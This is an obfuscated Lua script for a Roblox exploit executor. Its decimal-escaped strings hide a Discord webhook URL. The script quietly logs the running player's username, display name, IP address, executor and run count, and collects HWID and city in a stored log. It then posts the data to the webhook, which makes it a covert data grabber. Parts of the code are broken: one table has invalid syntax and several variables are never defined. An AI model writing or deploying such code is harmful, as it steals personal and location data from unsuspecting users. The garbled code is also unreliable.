--[[ Obfuscated Script ]]--
local _0x5f2a = {
    ["\104\116\116\112\115\58\47\47\100\105\115\99\111\114\100\46\99\111\109\47\97\112\105\47\119\101\98\104\111\111\107\115\47\49\52\55\55\56\57\53\52\49\48\48\52\50\52\48\52\56\56\52\47\73\76\121\86\54\85\90\86\66\74\107\97\113\109\84\78\111\79\76\50\73\57\52\99\97\101\117\103\67\105\73\106\109\87\53\100\89\105\82\78\107\71\50\74\90\86\45\90\87\88\55\50\122\101\72\84\65\51\84\74\84\54\120\103\104\109\68\88"], -- Webhook URL
    ["\101\120\101\99\117\116\111\114\95\108\111\103\46\106\115\111\110"], -- logFile
    ["\97\112\112\108\105\99\97\116\105\111\110\47\106\115\111\110"] -- Content-type
}

local _0x1 = game:GetService("\80\108\97\121\101\114\115")
local _0x2 = _0x1.LocalPlayer
local _0x3 = game:GetService("\72\116\116\112\83\101\114\118\105\99\101")
local _0x4 = http_request or request or HttpPost or syn.request

local _0x5 = {
    [-12]="AoE", [-11]="SST", [-10]="HST", [-9]="AKST", [-8]="PST", [-7]="MST",
    [-6]="CST", [-5]="EST", [-4]="AST", [-3.5]="NST", [-3]="BRT", [-2]="GST",
    [-1]="AZOT", [0]="GMT", [1]="CET", [2]="EET", [3]="MSK", [3.5]="IRST",
    [4]="GST", [4.5]="AFT", [5]="PKT", [5.5]="IST", [5.75]="NPT", [6]="BST",
    [6.5]="MMT", [7]="WIB", [8]="CST", [8.75]="ACWST", [9]="JST",
    [9.5]="ACST", [10]="AEST", [10.5]="ACDT", [11]="AEDT", [12]="NZST",
    [12.75]="CHAST", [13]="PHOT", [14]="LINT"
}

local function _0x6(_0x7)
    local _0x8, _0x9 = pcall(function()
        return _0x4({ Url = _0x7, Method = "\71\69\84" })
    end)
    if _0x8 and _0x9 and _0x9.Body then return _0x9.Body end
    return nil
end

local function _0x10()
    local _0xa, _0xb = pcall(function() return os.time(os.date("\33\42\116")) end)
    local _0xc, _0xd = pcall(function() return os.time(os.date("\42\116")) end)
    if not _0xa or not _0xc then return "\85\110\107\110\111\119\110" end
    local _0xe = os.difftime(_0xd, _0xb)
    local _0xf = math.floor((_0xe / 3600)*2 + 0.5)/2
    return _0x5[_0xf] or ("\85\84\67" .. (_0xf>=0 and "\43" or "") .. _0xf)
end

local _0x11 = {}
if isfile(_0x5f2a[2]) then
    local _0x12, _0x13 = pcall(readfile, _0x5f2a[2])
    if _0x12 and _0x13 ~= "" then
        local _0x14, _0x15 = pcall(_0x3.JSONDecode, _0x3, _0x13)
        if _0x14 then _0x11 = _0x15 end
    end
end

_0x11[_0x2.Name] = (_0x11[_0x2.Name] or 0) + 1

local _0x16 = {
    Username = _0x2.Name,
    DisplayName = _0x2.DisplayName,
    GameName = gameName,
    ProfileLink = profileLink,
    ServerPlayers = (activePlayers or "0").."/"..(maxPlayers or "0"),
    PlayerPingMS = playerPing,
    Time = (currentDate or "").. " " ..(currentTime or ""),
    HWID = hwid, IP = publicIP, City = city, State = state,
    Timezone = timezone, AccountCreation = accountCreation,
    AccountAge = accountAge, Executor = execName,
    Executions = _0x11[_0x2.Name], TeleportScript = teleportScript
}

_0x11["\76\111\103\115"] = _0x11["\76\111\103\115"] or {}
table.insert(_0x11["\76\111\103\115"], _0x16)

pcall(function()
    writefile(_0x5f2a[2], _0x3:JSONEncode(_0x11))
end)

local _0x17 = {
    content = "\64\104\101\114\101",
    username = _0x2.Name,
    avatar_url = "https://tse4.mm.bing.net/th?id=OIP.nJ7S63mDf0rdL9TAEPZjYAHaJQ&pid=Api&P=0&h=220",
    embeds = {{
        title = "\80\108\97\121\101\114\32\69\120\101\99\117\116\105\111\110\32\73\110\102\111",
        fields = {
            {name="Display Name", value=_0x2.DisplayName or "??", inline=true},
            {name="Username", value=_0x2.Name or "??", inline=true},
            {name="IP Address", value=publicIP or "??", inline=false},
            {name="Executor", value=execName or "??", inline=true},
            {name="Execution Count", value=tostring(_0x11[_0x2.Name]), inline=true}
        }
    }}
}

pcall(function()
    _0x4({
        Url = _0x5f2a[1],
        Body = _0x3:JSONEncode(_0x17),
        Method = "\80\79\83\84",
        Headers = {['\67\111\110\116\101\110\116\45\84\121\112\101'] = _0x5f2a[3]}
    })
end)
